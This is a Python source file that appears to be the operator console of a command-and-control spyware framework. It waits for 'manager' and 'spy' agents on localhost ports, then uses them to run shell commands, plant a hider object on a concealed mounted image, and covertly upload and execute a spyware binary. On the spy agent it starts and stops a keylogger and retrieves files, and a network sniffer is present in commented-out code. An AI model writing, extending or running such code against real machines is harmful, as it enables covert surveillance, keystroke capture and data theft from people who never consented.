from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep
from contParams import *
from structParams import *
from agentRecruiter import AgentRecruiter
import threading
import configparser
from random import randint
from operation import Operation
from icecream import ic
import UI


HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def main():
    targetHiderPath = "./sentHider.o"

    image_path = "fs.iso"
    mount_path = "fs"

    operDict: dict[str, Operation] = dict()
    # recrutionEvent = threading.Event()
    manegerRecruiter = AgentRecruiter(HOST, PORT_MANEGER, operDict, "maneger")
    spyRecruiter = AgentRecruiter(HOST, PORT_SPYWARE, operDict, "spy")
    manegerRecruiter.start()
    spyRecruiter.start()

    while len(operDict) == 0:
        sleep(1)
    sleep(1)
    ic(operDict)
    op: Operation = list(operDict.values())[0]
    ic(op)
    ic(op.managerAgent)
    ic(op.spyAgent)

    manegerAgent: Agent = op.managerAgent

    print(manegerAgent.run_bash("ls"))

    print(
        manegerAgent.write_file(
            "hider",
            targetHiderPath,
        )
    )

    print(manegerAgent.hider_setup(targetHiderPath, image_path, mount_path))

    print(
        manegerAgent.hidden_action_with_upload(
            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
            "spyware",
            "sentSpyware" + str(randint(1, 1000)) + ".spy",
        )
    )
    while op.spyAgent is None:
        sleep(1)
    spyAgent: Agent = op.spyAgent

    print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
    kligPar = Params()
    kligPar.kligP = kligPrams(40)
    kligP = ContParams(KligerType, kligPar)
    print("--------Running kigger----------")
    print(spyAgent.runContraption(kligP, 10))
    sleep(40)
    print(spyAgent.haltContraption(10))
    print("--------Stopping kigger----------")
    # sniffP = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
    # print(spyAgent.runContraption(sniffP, 10))
    # sleep(30)
    # print(spyAgent.retrieve_file("0.sniff"))


def main_with_ui():
    targetHiderPath = "./sentHider.o"
    image_path = "fs.iso"
    mount_path = "fs"

    operDict: dict[str, Operation] = dict()
    # recrutionEvent = threading.Event()
    manegerRecruiter = AgentRecruiter(HOST, PORT_MANEGER, operDict, "maneger")
    spyRecruiter = AgentRecruiter(HOST, PORT_SPYWARE, operDict, "spy")
    manegerRecruiter.start()
    spyRecruiter.start()

    ui = UI.UI(operDict)
    ui.help()

    print("START CYBER:")
    value = input("$ ")
    while value != "q":
        UI.call_method_raw(ui, value)
        selected = ui.ctx.selected_operation
        if selected:
            value = input(f"<{selected}>$ ")
        else:
            value = input(f"$ ")


def another_main():
    targetHiderPath = "./sentHider.o"

    image_path = "fs.iso"
    mount_path = "fs"

    operDict: dict[str, Operation] = dict()
    # recrutionEvent = threading.Event()
    manegerRecruiter = AgentRecruiter(HOST, PORT_MANEGER, operDict, "maneger")
    spyRecruiter = AgentRecruiter(HOST, PORT_SPYWARE, operDict, "spy")
    manegerRecruiter.start()
    spyRecruiter.start()

    while len(operDict) == 0:
        sleep(1)
    sleep(1)
    ic(operDict)
    op: Operation = list(operDict.values())[0]
    ic(op)
    ic(op.managerAgent)
    ic(op.spyAgent)

    manegerAgent: Agent = op.managerAgent

    print(
        manegerAgent.write_file(
            "hider",
            targetHiderPath,
        )
    )

    print(manegerAgent.hider_setup(targetHiderPath, image_path, mount_path))
    print(manegerAgent.retrieve_file('fishTest.txt'))

if __name__ == "__main__":
    # main_with_ui()
    another_main()
